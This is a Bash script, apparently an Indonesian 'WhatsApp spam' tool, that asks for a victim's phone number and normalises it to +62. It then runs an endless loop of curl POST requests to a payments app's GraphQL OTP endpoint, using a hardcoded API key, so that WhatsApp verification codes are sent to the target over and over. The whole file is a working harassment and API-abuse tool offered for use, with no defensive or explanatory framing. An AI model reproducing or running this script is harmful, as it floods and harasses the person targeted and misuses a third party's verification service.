# Author Mr.Tr3v!0n & A-Gmvt

b="\033[34;1m"
 p="\033[39;1m"
  k="\033[33;1m"
   m="\033[31;1m"
    h="\033[32;1m"
     c="\033[35;1m"
      pu="\033[36;1m"
       ds="\033[30;1m"
        o="\033[0m"
        JAM=`date +%H`
          MENIT=`date +%M`
            DETIK=`date +%S`
             TANGGAL=`date +%d`
           BULAN=`date +%m`
        TAHUN=`date +%Y`
        
        load(){
        printf "\t ${p}[${c}•${p}]${pu}Proses Spaming${h}"
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf ".\n"
        }

function check(){
		if [ -z $(command -v curl) ];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
		if [ -z $(command -v bash) ];then
		printf "${p}[${m}!${p}]${m}bash belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
}
check
clear
printf "\t                  ${ds}Tools${m}: ${p}1.0 *_*\n"
printf "\t${b}______________________________\n"
printf "\t      ${p}Author${m}: ${c} IqbalxBobz\n"
printf "\t    ${p}Team${m}: ${h} Solo Player\n"
printf "\t${p} TOOLS SPAM WHATSAPP UNLIMITED\n"
printf "\t   ${p}Telegram${m}: ${c}@config_geratis\n"
#printf "\t ${p}Subscribe Youtube${m}: ${k}Inject ID\n"
printf "\t${b}______________________________\n"
printf "\t ${ds}[08-11-20] ${m}| ${ds}©Copyright_2022\n\n"
function spam(){
for (( i=1; i>=i; i++ ));do

spm=$(curl -s -X POST -H "Content-Type:application/json" -d '{"operationName":"SendOtpMutation","variables":{"input":{"mobile":"'$number'","purpose":"AUTH","mode":"WHATSAPP","skipBusinessCreation":true},"key":"a55e5351-d70a-44a5-b219-908b58a90c75"},"query":"mutation SendOtpMutation($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    success\n    __typename\n  }\n}\n"}' "https://api.beecash.io/graphql" | jq -r .data.sendOtp.success)

	if [[ $spm =~ "true" ]];then
		printf "${p}[${h}$i${p}] Spaming WhatsApp To ${pu}$number ${m}[${h} Berhasil ${m}]\n"
		sleep 0.5
	fi
done
}

function __main__(){
	printf "\t${b}╔════════════════════════╗ \n"
    printf "\t${b}║${p}NO TARGET${m}:${pu} " number
    read number;
    printf "\t${b}╚════════════════════════╝\n"    

   if [[ ${number:0:2} =~ "08" ]]; then
   number="+62${number:1:15}"
   printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   elif [[ ${number:0:2} =~ "62" ]]; then
   number="+62${number:2:15}"
   printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   elif [[ ${number:0:3} =~ "+62" ]]; then
   number="$number"
   printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   else 
   printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
   exit 1
   fi
}
__main__